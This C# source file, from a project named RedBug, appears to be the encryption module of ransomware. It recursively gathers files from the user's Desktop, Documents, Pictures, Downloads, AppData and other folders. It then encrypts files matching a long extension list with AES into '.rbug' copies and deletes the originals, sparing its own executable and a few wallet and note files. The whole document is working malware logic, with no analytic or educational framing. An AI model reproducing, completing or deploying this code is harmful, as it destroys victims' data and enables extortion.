using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Web;

namespace RedBug
{
    internal class Encrypt
    {
        string[] extensions = { ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".csv", ".json", ".xml", ".html", ".htm", ".css", ".js", ".exe", ".msi", ".bat", ".cmd", ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp", ".svg", ".mp3", ".wav", ".ogg", ".mp4", ".avi", ".mkv", ".mov", ".zip", ".rar", ".7z", ".tar", ".gz", ".iso", ".dll", ".sys", ".tmp", ".log", ".rtf", ".md", ".ini", ".cfg", ".conf", ".db", ".sql", ".apk", ".jar", ".py", ".cs", ".cpp", ".c", ".h", ".hpp", ".java", ".php", ".rb", ".go", ".ts", ".swift", ".kt", ".sh", ".ps1", ".tex", ".bak", ".dat", ".bin", ".nfo", ".yaml", ".yml", ".psd", ".ai", ".eps", ".ico", ".flac", ".aac", ".wma", ".m4a", ".wmv", ".flv", ".webm", ".torrent", ".lock", ".cache", ".temp", ".old", ".backup", ".sav", ".dump", ".out", ".err", ".idx", ".map", ".lst", ".meta", ".pak", ".res", ".assets", ".blob", ".stream", ".pkt", ".session", ".state", ".trace", ".dbg", ".unit", ".node", ".chunk", ".fragment", ".queue", ".pipe", ".signal", ".evt", ".msg", ".payload" };

        public List<string> directories = new List<string>();
        public List<string> files = new List<string>();
        public void ScanUserFiles()
        {
            var folders = new List<string>()
            {
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData")
            };

            foreach (var folder in folders)
            {
                if (!Directory.Exists(folder))
                    continue;

                var stack = new Stack<string>();
                stack.Push(folder);

                while (stack.Count > 0)
                {
                    var current = stack.Pop();

                    try
                    {
                        // Add directory
                        directories.Add(current);

                        // Get files (no filter)
                        foreach (var file in Directory.GetFiles(current))
                        {
                            files.Add(file);
                        }

                        // Queue subdirectories
                        foreach (var dir in Directory.GetDirectories(current))
                        {
                            stack.Push(dir);
                        }
                    }
                    catch
                    {
                        // Skip access denied folders
                        continue;
                    }
                }
            }
        }

        public string GetKey()
        {
            string final = "";
            List<char> Chars_ = new List<char>();

            string Chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-|}@!#$%^&*";

            foreach (char c in Chars) { 
                Chars_.Add(c);
            }
            Random r = new Random();


            for (int i = 0; i < 16; i++)
            {
                int index = r.Next(0, Chars.Length);
                final += Chars_[index];
            }


            return final;
        }

        public void StartEncrypt(string key, string iv)
        {
            

            string safe = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\sys32s32x64.txt";

            string safe2 = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\sys32s32x32.txt";

            string safe3 = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\fgraph.txt";

            string safe4 = "C:\\Users\\" + Environment.UserName + "\\Desktop\\Wallets-12304.txt";

            string safe5 = Environment.ProcessPath;

            string safe6 = @$"C:\Users\{Environment.UserName}\Desktop\final-21344509211235.jpg";

            foreach (var f in files) {
                if (f == safe || f == safe2 || f == safe3 || f == safe4 || f == safe5 || f == safe6)
                {
                    //
                }
                else
                {
                    var ext = Path.GetExtension(f);

                    if (extensions.Contains(ext, StringComparer.OrdinalIgnoreCase))
                    {
                        new Thread(() => { Enc(f, key, iv); }).Start();
                    }
                }
            }
        }

        private static void Enc(string filepath, string key, string iv)
        {
            try
            {
                var key_ = Encoding.UTF8.GetBytes(key);

                var IV_ = Encoding.UTF8.GetBytes(iv);

                var filepath2 = filepath + ".rbug";

                var fs = new FileStream(filepath, FileMode.Open, FileAccess.Read);

                var fw = new FileStream(filepath2, FileMode.Create, FileAccess.Write);

                var aes = new RijndaelManaged();
                var aes_ = aes.CreateEncryptor(key_, IV_);

                var cw = new CryptoStream(fw, aes_, CryptoStreamMode.Write);


                int q;
                while ((q = fs.ReadByte()) != -1)
                {
                    cw.WriteByte((byte)q);
                }


                fs.Close();
                fw.Close();

                Form1.encryption_count++;
                File.Delete(filepath);
            }
            catch
            {
                // file is ither being used or cant be accessed by the Program.
            }
        }

    }
}
